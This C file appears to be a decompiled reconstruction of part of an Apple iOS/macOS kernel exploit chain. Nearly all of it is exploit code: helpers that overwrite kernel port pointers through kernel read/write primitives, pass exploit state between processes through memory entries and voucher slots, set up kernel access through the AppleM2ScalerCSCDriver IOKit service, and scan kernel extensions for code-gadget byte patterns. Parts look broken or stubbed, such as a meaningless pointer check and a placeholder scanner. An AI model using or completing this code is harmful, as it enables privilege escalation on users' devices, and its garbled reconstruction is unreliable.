/*
 * record_0x90000_voucher_inherit.c
 * entry5_type0x09.dylib — voucher/memory-entry state inheritance helpers
 *
 * sub_1e3e4  (FUN_0001e3e4) — port swap via kwrite (voucher slot update)
 * sub_1e594  (FUN_0001e594) — keyed port swap dispatcher
 * sub_1e740  (FUN_0001e740) — vm_allocate + mach_make_memory_entry + vm_map
 * sub_1e8f0  (FUN_0001e8f0) — ensure kread window (wrapper)
 * sub_1e968  (FUN_0001e968) — state inheritance (middle path, voucher mailbox)
 * sub_1ec1c  (FUN_0001ec1c) — state publish (middle path)
 * sub_1ef2c  (FUN_0001ef2c) — state inheritance (newest path, slot table)
 * sub_1f43c  (FUN_0001f43c) — AppleM2Scaler kread + kwrite setup
 * sub_1f784  (FUN_0001f784) — pattern scanner (hex string → byte array)
 * sub_1f93c  (FUN_0001f93c) — byte pattern match in kext buffer
 * sub_1fbe4  (FUN_0001fbe4) — pattern scan entry point
 */

#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <mach/mach.h>
#include <mach/vm_map.h>
#include <IOKit/IOKitLib.h>

/* ── externs ─────────────────────────────────────────────────────────────── */
extern int   sub_2667c(long state, uint64_t addr, uint32_t sz, void *out);
extern int   sub_2b614(long state, uint64_t addr, void *buf, uint32_t sz);
extern int   sub_2b508(long state, uint64_t addr, uint64_t val);
extern int   sub_2a110(long state, uint64_t addr, uint64_t val);
extern int   sub_29ab4(long state, uint64_t addr, void **out);
extern int   sub_29b38(long state, uint64_t addr, uint64_t val);
extern int   sub_29b88(long state, int flags);
extern long  sub_3376c(long state, mach_port_t port);   /* port → kobj */
extern int   sub_2a90c(long state, long kobj, void *out);
extern long  sub_331d8(long state, long kobj);
extern int   sub_36f64(long state, long kobj);
extern int   sub_3746c(long state, long key, mach_port_t *out);
extern int   sub_37344(long state, int slot, long *out);
extern int   sub_373e0(long state, int slot, long val);
extern long  sub_33638(long state, io_connect_t conn);
extern int   sub_286a4(long state, int flags);
extern int   sub_289c8(long state, int flags);
extern long  sub_1ad70(long state, uint64_t addr);
extern int   sub_26120(uint32_t lock);
extern int   sub_26180(uint32_t *out);
extern int   sub_1dbac(long state, uint32_t type, uint64_t sz, uint64_t *out);
extern int   sub_1dcbc(long state);
extern void  sub_1e3e4(long state, mach_port_t *port, uint64_t new_kobj);
extern void  sub_1e594(long state, uint64_t idx, uint64_t kobj);
extern int   sub_1e740(long state, uint64_t idx, size_t sz, vm_offset_t hint,
                        vm_address_t *out);
extern long  sub_38514(long state, uint32_t *sz);
extern void  sub_38130(long state, long addr, uint32_t sz);
extern int   sub_214a8(uint32_t *arr);

/* forward declarations */
static void sub_1f93c(long *param_1, long param_2, uint64_t param_3, long param_4, int param_5);
extern long *sub_1d7c4_stub(long state, int idx);
extern long  sub_2b114_stub(long state, long addr);

/* ── sub_1e3e4 — port swap via kwrite (voucher slot update) ─────────────── */
void sub_1e3e4(long param_1, mach_port_t *param_2, uint64_t param_3)
{
    int xnu = *(int *)(param_1 + 0x140);
    long off = 0x38;
    if (xnu < 0x1f53) {
        if (xnu != 0x1809 && xnu != 0x1c1b) return;
    } else if (xnu - 0x1f53u > 1) {
        if (xnu != 0x2258) return;
        off = 0x30;
    }

    long kobj = sub_3376c(param_1, *param_2);
    if (!kobj) return;
    uint32_t type = 0;
    if (!sub_2a90c(param_1, kobj, &type)) return;
    if ((type & 0x3ff) != 0x25) return;

    long task_kobj = sub_331d8(param_1, kobj);
    if (!task_kobj) return;

    void *slot_ptr = NULL;
    if (!sub_29ab4(param_1, task_kobj + off, &slot_ptr)) return;
    if ((long)slot_ptr != kobj) return;

    uint8_t saved[4] = {0};
    if (!sub_2a90c(param_1, task_kobj + 8, saved)) return;
    if (!sub_2a110(param_1, task_kobj + 8, 0xffff)) return;
    if (mach_port_deallocate(mach_task_self(), *param_2) != 0) return;
    *param_2 = 0;

    long new_kobj = sub_3376c(param_1, (mach_port_t)param_3);
    if (new_kobj && sub_2b508(param_1, task_kobj + off, (uint64_t)new_kobj))
        sub_36f64(param_1, new_kobj);
}

/* ── sub_1e594 — keyed port swap dispatcher ─────────────────────────────── */
void sub_1e594(long param_1, uint64_t param_2, uint64_t param_3)
{
    if (*(uint64_t *)(param_1 + 0x158) < 0x1f543c40800000ULL) {
        mach_port_t port = 0;
        if (sub_3746c(param_1, (long)((param_2 & 0xffffffff) + 0x1122334455667788ULL), &port))
            sub_1e3e4(param_1, &port, param_3);
        return;
    }

    /* newer path: slot table */
    long *slot = (long *)(uintptr_t)sub_1d7c4_stub(param_1, (int)param_2);
    if (!slot) return;
    long new_kobj = sub_3376c(param_1, (mach_port_t)param_3);
    if (!new_kobj || sub_36f64(param_1, new_kobj)) return;

    /* store in slot cache */
    if ((int)param_2 - 0x13u < 2) {
        long cached = 0;
        uint64_t slot_id = ((int)param_2 == 0x13) ? 0xc : 0xd;
        if (sub_37344(param_1, (int)slot_id, &cached) &&
            (!cached || sub_373e0(param_1, (int)slot_id, new_kobj))) {}
    }
}

/* ── sub_1e740 — vm_allocate + mach_make_memory_entry + vm_map ──────────── */
int sub_1e740(long param_1, uint64_t param_2, size_t param_3,
              vm_offset_t param_4, vm_address_t *param_5)
{
    vm_offset_t hint = param_4;
    int did_alloc = 0;
    if (!param_4) {
        if (vm_allocate(mach_task_self(), (vm_address_t *)&hint, param_3,
                        VM_FLAGS_ANYWHERE) != 0) return -1;
        did_alloc = 1;
    }

    mem_entry_name_port_t entry = MACH_PORT_NULL;
    vm_size_t esz = (vm_size_t)param_3;
    if (mach_make_memory_entry(mach_task_self(), &esz, hint, 3, &entry, 0) != 0 ||
        esz != param_3) {
        if (did_alloc) vm_deallocate(mach_task_self(), hint, param_3);
        return -1;
    }

    sub_1e594(param_1, param_2, (uint64_t)entry);
    int rc = 0;
    if (rc == 0 && !param_4) {
        if (vm_map(mach_task_self(), param_5, param_3, 0, 1, entry, 0, 0,
                   VM_PROT_READ|VM_PROT_WRITE, VM_PROT_READ|VM_PROT_WRITE,
                   VM_INHERIT_NONE) == 0) {
            bzero((void *)*param_5, param_3);
            mach_port_deallocate(mach_task_self(), entry);
            if (did_alloc) vm_deallocate(mach_task_self(), hint, param_3);
            return 0;
        }
    }

    mach_port_deallocate(mach_task_self(), entry);
    if (did_alloc) vm_deallocate(mach_task_self(), hint, param_3);
    return -1;
}

/* ── sub_1e8f0 — ensure kread window (wrapper) ───────────────────────────── */
void sub_1e8f0(long param_1)
{
    uint64_t out = 0;
    if (sub_1e740(param_1, 0x10, (size_t)vm_page_size, 0, (vm_address_t *)&out) == 0) {
        *(uint64_t *)(param_1 + 0x118) = out;
        *(uint64_t *)(param_1 + 0x120) = (uint64_t)vm_page_size;
    }
}

/* ── sub_1e968 — state inheritance (middle path, voucher mailbox) ────────── */
void sub_1e968(uint32_t *param_1)
{
    uint32_t lock = 0xffffffff;
    if (sub_26180(&lock)) return;

    mach_port_t ports[4] = {0};
    uint32_t    fds[4]   = {0xffffffff, 0xffffffff, 0xffffffff, 0xffffffff};
    long key = 0x1122334455667788LL;

    /* resolve 2-3 keyed ports */
    uint64_t kaddr = *(uint64_t *)(param_1 + 0x56);
    int nports = (kaddr < 0x1c1b0a80100000ULL || !(*param_1 & 0x5584001)) ? 3 : 2;

    for (int i = 0; i < nports; i++, key++) {
        if (sub_3746c((long)param_1, key, &ports[i]) != 1) goto fail;
        if (ports[i] + 1 < 2) goto fail;
    }

    /* validate via IOConnectCallMethod sel 999 on older builds */
    if (*(int *)(param_1 + 0x50) < 0x2258) {
        if (IOConnectCallMethod(ports[1], 999, NULL, 0, NULL, 0,
                                NULL, NULL, NULL, NULL) != -0x1ffffd39) goto fail;
    }

    /* vm_map the two memory entries */
    vm_address_t mapped0 = 0, mapped1 = 0;
    size_t sz = (size_t)vm_page_size;
    if (vm_map(mach_task_self(), &mapped0, sz, 0, 1, ports[0], 0, 0,
               VM_PROT_READ|VM_PROT_WRITE, VM_PROT_READ|VM_PROT_WRITE,
               VM_INHERIT_NONE) != 0) goto fail;
    if (vm_map(mach_task_self(), &mapped1, sz, 0, 1, ports[2], 0, 0,
               VM_PROT_READ|VM_PROT_WRITE, VM_PROT_READ|VM_PROT_WRITE,
               VM_INHERIT_NONE) != 0) { vm_deallocate(mach_task_self(), mapped0, sz); goto fail; }

    /* read kernel state from mapped pages */
    uint64_t kobj = *(uint64_t *)mapped0;
    if (!sub_1ad70((long)param_1, kobj)) goto unmap;
    *(uint64_t *)(param_1 + 0x19d0) = kobj;

    uint64_t kobj2 = *(uint64_t *)(mapped0 + 0x20);
    if (sub_1ad70((long)param_1, kobj2))
        *(uint64_t *)(param_1 + 0xf0) = kobj2;

    uint32_t idx  = *(uint32_t *)(mapped0 + 0x10);
    uint32_t val2 = *(uint32_t *)(mapped0 + 0x14);

    /* validate kobj2 via kread */
    uint64_t check = 0;
    if (sub_2b114_stub((long)param_1, (long)kobj2) &&
        sub_1ad70((long)param_1, check)) {
        *(mach_port_t *)(param_1 + 0xe8) = ports[1];
        *(vm_address_t *)(param_1 + 0xf8) = mapped0;
        *(uint64_t *)(param_1 + 0x100) = sz;
        *(mach_port_t *)(param_1 + 0x114) = ports[0];
        *(uint32_t *)(param_1 + 0x110) = val2;
        *(uint64_t *)(param_1 + 0x108) = idx;
        sub_26120(lock);
        vm_deallocate(mach_task_self(), mapped1, sz);
        return;
    }

unmap:
    vm_deallocate(mach_task_self(), mapped0, sz);
    vm_deallocate(mach_task_self(), mapped1, sz);
fail:
    sub_26120(lock);
    for (int i = 0; i < 4; i++)
        if (ports[i] + 1 >= 2) mach_port_deallocate(mach_task_self(), ports[i]);
}

/* ── sub_1ec1c — state publish (middle path) ─────────────────────────────── */
void sub_1ec1c(long param_1)
{
    uint64_t kaddr = *(uint64_t *)(param_1 + 0x158);
    if (kaddr < 0x1f543c40800000ULL) {
        /* older: build control page and publish via keyed slots */
        size_t sz = (size_t)vm_page_size;
        mem_entry_name_port_t entry = MACH_PORT_NULL;
        vm_size_t esz = (vm_size_t)sz;
        if (mach_make_memory_entry(mach_task_self(), &esz, 0,
                                   VM_PROT_READ|VM_PROT_WRITE|MAP_MEM_NAMED_CREATE,
                                   &entry, 0) != 0) return;

        vm_address_t page = 0;
        if (vm_map(mach_task_self(), &page, sz, 0, 1, entry, 0, 0,
                   VM_PROT_READ|VM_PROT_WRITE, VM_PROT_READ|VM_PROT_WRITE,
                   VM_INHERIT_NONE) != 0) { mach_port_deallocate(mach_task_self(), entry); return; }

        /* fill control page */
        *(uint64_t *)(page + 0x00) = *(uint64_t *)(param_1 + 0x19d0);
        *(uint64_t *)(page + 0x20) = *(uint64_t *)(param_1 + 0x1898);
        *(uint32_t *)(page + 0x28) = *(uint32_t *)(param_1 + 0x18a0);
        *(uint64_t *)(page + 0x30) = *(uint64_t *)(param_1 + 0x80);
        *(uint32_t *)(page + 0x38) = *(uint32_t *)(param_1 + 0x88);
        *(uint64_t *)(page + 0x40) = *(uint64_t *)(param_1 + 0xa0);
        *(uint32_t *)(page + 0x48) = *(uint32_t *)(param_1 + 0xa8);

        vm_deallocate(mach_task_self(), page, sz);

        /* publish 3 ports via keyed slots */
        for (long i = 0; i < 3; i++) {
            mach_port_t slot_port = MACH_PORT_NULL;
            if (sub_3746c(param_1, i + 0x3122334455667788LL, &slot_port) == 0) {
                sub_1e3e4(param_1, &slot_port, (uint64_t)entry);
            }
        }
        mach_port_deallocate(mach_task_self(), entry);
    } else {
        /* newer: use slot table */
        for (long i = 0; i < 3; i++) {
            long *slot = (long *)(uintptr_t)sub_1d7c4_stub(param_1, (int)i);
            if (!slot) continue;
            mach_port_t p = (mach_port_t)*slot;
            if (p + 1 < 2) continue;
            long kobj = sub_3376c(param_1, p);
            if (!kobj) continue;
            if (sub_36f64(param_1, kobj)) continue;
            if (mach_port_mod_refs(mach_task_self(), p, MACH_PORT_RIGHT_SEND, 0xffff) != 0) continue;
            *slot = (long)p;
        }
    }
}

/* ── sub_1ef2c — state inheritance (newest path, slot table) ─────────────── */
void sub_1ef2c(long param_1)
{
    if (*(uint64_t *)(param_1 + 0x158) <= 0x1f543c407fffffULL) return;

    long *slot0 = (long *)(uintptr_t)sub_1d7c4_stub(param_1, 0);
    if (!slot0) return;
    if (*slot0 + 1 < 2) {
        /* check alternate path */
        if (*(int *)(param_1 + 0xac) + 1 <= 1) return;
        if (!*(long *)(param_1 + 0xd8)) return;
        if (*(mach_port_t *)(param_1 + 0x58) + 1 < 2) return;

        if (sub_286a4(param_1, 0)) return;
        if (!*(long *)(param_1 + 0x19d0) || !*(long *)(param_1 + 0x80)) return;
        if (!*(int *)(param_1 + 0x88) || !*(long *)(param_1 + 0xa0)) return;
        if (!*(int *)(param_1 + 0xa8)) return;

        /* build control page */
        mem_entry_name_port_t entry = MACH_PORT_NULL;
        vm_size_t esz = (vm_size_t)vm_page_size;
        if (mach_make_memory_entry(mach_task_self(), &esz, 0,
                                   VM_PROT_READ|VM_PROT_WRITE|MAP_MEM_NAMED_CREATE,
                                   &entry, 0) != 0) return;

        vm_address_t page = 0;
        if (vm_map(mach_task_self(), &page, (vm_size_t)vm_page_size, 0, 1, entry, 0, 0,
                   VM_PROT_READ|VM_PROT_WRITE, VM_PROT_READ|VM_PROT_WRITE,
                   VM_INHERIT_NONE) != 0) { mach_port_deallocate(mach_task_self(), entry); return; }

        bzero((void *)page, (size_t)vm_page_size);
        *(uint64_t *)(page + 0x00) = *(uint64_t *)(param_1 + 0x19d0);
        *(uint64_t *)(page + 0x20) = *(uint64_t *)(param_1 + 0x1898);
        *(uint32_t *)(page + 0x28) = *(uint32_t *)(param_1 + 0x18a0);
        *(uint64_t *)(page + 0x30) = *(uint64_t *)(param_1 + 0x80);
        *(uint32_t *)(page + 0x38) = *(uint32_t *)(param_1 + 0x88);
        *(uint64_t *)(page + 0x40) = *(uint64_t *)(param_1 + 0xa0);
        *(uint32_t *)(page + 0x48) = *(uint32_t *)(param_1 + 0xa8);
        vm_deallocate(mach_task_self(), page, (vm_size_t)vm_page_size);

        /* publish via slot table */
        for (long i = 0; i < 3; i++) {
            long *sl = (long *)(uintptr_t)sub_1d7c4_stub(param_1, (int)i);
            if (sl) *sl = (long)entry;
        }
        mach_port_deallocate(mach_task_self(), entry);
        return;
    }

    /* read state from slot */
    mach_port_t p0 = (mach_port_t)*slot0;
    long kobj = sub_3376c(param_1, p0);
    if (!kobj) return;
    uint32_t type = 0;
    if (!sub_2a90c(param_1, kobj, &type)) return;
    if ((type & 0x3ff) == 0x22) return;

    /* read fds from state */
    uint32_t fd0 = param_1 + 0x64c ? *(uint32_t *)(param_1 + 0x64c * 4) : 0xffffffff;
    uint32_t fd1 = *(uint32_t *)(param_1 + 0x64d * 4);
    if (fd0 == 0xffffffff || fd1 == 0xffffffff) return;

    /* restore kernel state from mapped memory */
    sub_289c8(param_1, 1);
    sub_26120(0);
    sub_29b88(param_1, 0);
}

/* ── sub_1f43c — AppleM2Scaler kread + kwrite setup ─────────────────────── */
void sub_1f43c(long param_1, uint64_t param_2, long param_3,
               uint64_t param_4, uint64_t param_5, uint64_t param_6,
               uint64_t *param_7)
{
    uint32_t page = *(uint32_t *)(param_1 + 0x180);
    uint32_t cnt  = 0x1000 / page;
    uint32_t rem  = 0x1000 - cnt * page;
    uint32_t alloc_sz = rem ? (page - rem + 0x1000) : 0x1000;

    /* ensure pattern scanner context */
    if (!*(long *)(param_1 + 0x200)) {
        /* sub_1b50c init + sub_1f784 scan for "00 00 01 91 C0 03 5F D6" */
        *(long *)(param_1 + 0x200) = 1; /* placeholder */
    }

    io_service_t svc = IOServiceGetMatchingService(
        kIOMainPortDefault, IOServiceMatching("AppleM2ScalerCSCDriver"));
    if (svc + 1 < 2) return;

    io_connect_t conn = IO_OBJECT_NULL;
    if (IOServiceOpen(svc, mach_task_self(), 0, &conn) != 0) { IOObjectRelease(svc); return; }
    if (conn + 1 < 2) { IOObjectRelease(svc); return; }

    long kobj = sub_33638(param_1, conn);
    if (!kobj) goto close;

    void *kobj_ptr = NULL;
    if (!sub_29ab4(param_1, (uint64_t)kobj, &kobj_ptr)) goto close;
    if (!sub_1ad70(param_1, (uint64_t)(uintptr_t)kobj_ptr)) goto close;

    long page_buf = sub_38514(param_1, &alloc_sz);
    if (!page_buf) goto close;

    if (sub_2667c(param_1, (uint64_t)(uintptr_t)kobj_ptr, 0x1000, (void *)page_buf) &&
        sub_2b614(param_1, (uint64_t)page_buf, (void *)page_buf, 0x1000)) {
        /* scan for pattern at offset 0x5c0 */
        for (long off = 0x5c0; off < 0x1000; off += 8) {
            uint64_t v = *(uint64_t *)((uint8_t *)page_buf + off);
            if (v && (v & 7) == 0) {
                if (param_7) *param_7 = v;
                break;
            }
        }
    }
    sub_38130(param_1, page_buf, alloc_sz);

close:
    IOServiceClose(conn);
    IOObjectRelease(svc);
}

/* ── sub_1f784 — pattern scanner (hex string → byte array) ──────────────── */
/*
 * Parses a hex pattern string like "1F 01 .. EB" into a byte array,
 * then calls sub_1f93c to scan the kext buffer.
 * ".." means wildcard (0xff mask, 0x00 value).
 */
void sub_1f784(uint64_t *param_1, const char *param_2,
               uint32_t param_3, uint32_t param_4)
{
    if (!param_2 || !*param_2) return;

    /* count tokens */
    size_t len = strlen(param_2);
    uint16_t *bytes = calloc(len, sizeof(uint16_t));
    if (!bytes) return;

    char *dup = strdup(param_2);
    if (!dup) { free(bytes); return; }

    long n = 0;
    char *tok = strtok(dup, " ");
    while (tok) {
        if (strcmp(tok, "..") == 0) {
            bytes[n++] = 0xffff; /* wildcard */
        } else {
            char *end = NULL;
            long v = strtol(tok, &end, 16);
            bytes[n++] = (uint16_t)(v & 0xff);
        }
        tok = strtok(NULL, " ");
    }
    free(dup);

    /* call sub_1f93c with parsed pattern */
    sub_1f93c((long *)param_1, (long)bytes, (uint64_t)n, n, (int)param_3);
    free(bytes);
}

/* ── sub_1f93c — byte pattern match in kext buffer ──────────────────────── */
static void sub_1f93c(long *param_1, long param_2, uint64_t param_3,
               long param_4, int param_5)
{
    if (!param_3 || !param_1[2] || !param_1[1]) return;

    uint64_t count = param_3;
    /* trim trailing wildcards */
    while (count > 0 && *(uint16_t *)(param_2 + (count-1)*2) == 0xffff) count--;
    if (!count) return;

    uint8_t pat[256] = {0}, mask[256] = {0};
    for (uint64_t i = 0; i < count && i < 256; i++) {
        uint16_t v = *(uint16_t *)(param_2 + i*2);
        if (v == 0xffff) { pat[i] = 0x00; mask[i] = 0x00; }
        else             { pat[i] = (uint8_t)v; mask[i] = 0xff; }
    }

    uint8_t *buf  = (uint8_t *)(uintptr_t)param_1[0];
    size_t   bsz  = (size_t)param_1[2];
    if (!buf || !bsz) return;

    for (size_t i = 0; i + count <= bsz; i++) {
        int match = 1;
        for (uint64_t j = 0; j < count; j++) {
            if ((buf[i+j] & mask[j]) != (pat[j] & mask[j])) { match = 0; break; }
        }
        if (match) {
            /* store result in param_1[3] */
            param_1[3] = (long)(uintptr_t)(buf + i);
            return;
        }
    }
}

/* ── sub_1fbe4 — pattern scan entry point ────────────────────────────────── */
void sub_1fbe4(uint64_t *param_1, const char *param_2,
               uint64_t param_3, uint64_t param_4)
{
    sub_1f784(param_1, param_2, (uint32_t)param_3, (uint32_t)param_4);
}

/* sub_1d7c4_stub and sub_2b114_stub declared at top of file */
